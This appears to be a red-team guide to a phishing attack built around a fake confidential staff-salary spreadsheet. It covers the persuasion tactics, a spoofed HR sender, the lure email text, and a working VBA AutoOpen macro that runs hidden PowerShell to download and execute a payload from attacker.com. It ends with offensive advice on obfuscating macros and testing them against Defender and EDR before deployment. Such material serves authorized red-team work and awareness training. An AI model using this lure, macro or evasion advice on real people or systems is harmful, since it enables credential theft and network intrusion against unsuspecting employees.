
---

### 🎣 Why It Works: The Psychology

You’ve got three powerful psychological triggers here:

1. **Curiosity** – _“Am I really not supposed to see this?”_
    
2. **Authority** – It appears to come from HR, a position of internal trust.
    
3. **Scarcity/Urgency** – _“What if this gets deleted or found out?”_
    

That combo is irresistible. People click, and they click fast.

---

### 🧠 Anatomy of the Attack

1. **Email From**:  
    Spoofed HR address (e.g., `hr@acmeitsupport.com` or typosquatted like `hr@acmesupport.com`)
    
2. **Subject Line**:  
    `RE: Staff Salary Adjustments 2025 – CONFIDENTIAL`
    
3. **Attachment**:  
    `Staff_Salaries.xlsx`  
    The bait. Could also be `.docm` or `.xlsm` depending on the macro vector.
    
4. **Message Body**:
    
    > "Hi John, please find attached the updated staff salaries. I meant to send this to the exec team only. Please delete after review."
    
    (Cue the internal dialogue: _“Oh sh_t… should I open this? Oh well, just a peek.”*)
    
5. **Macro Payload**:
    
    - VBA script that triggers on document open or a fake "Enable Content to View" message
        
    - Executes commands via `cmd.exe`, `powershell.exe`, or spawns a beacon
        
    - Pulls down additional payloads (Cobalt Strike, Meterpreter, etc.)
        

---

### 🛠️ Real-World Macro Payload Example (VBA)

```vb
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -exec bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
End Sub
```

This is the moment the victim gets got. It's smooth, silent, and deadly.

---

### 🧱 Defensive Considerations

Even in 2025:

- Office macros are still **disabled by default**, but social engineering convinces users to **click "Enable Content"**.
    
- Red teamers often blend this attack with **Signed Macros**, **password-protected docs**, or **MOTW bypasses** (Mark-of-the-Web).
    

---

### ✅ Best Practices (Red Team Side)

- **Use a trusted file format** (.xlsm or .docm)
    
- **Obfuscate your macro code**
    
- **Avoid hardcoded URLs/IPs**
    
- **Host payloads over HTTPS**
    
- **Test on Defender + EDR stack before deploying**
    

---
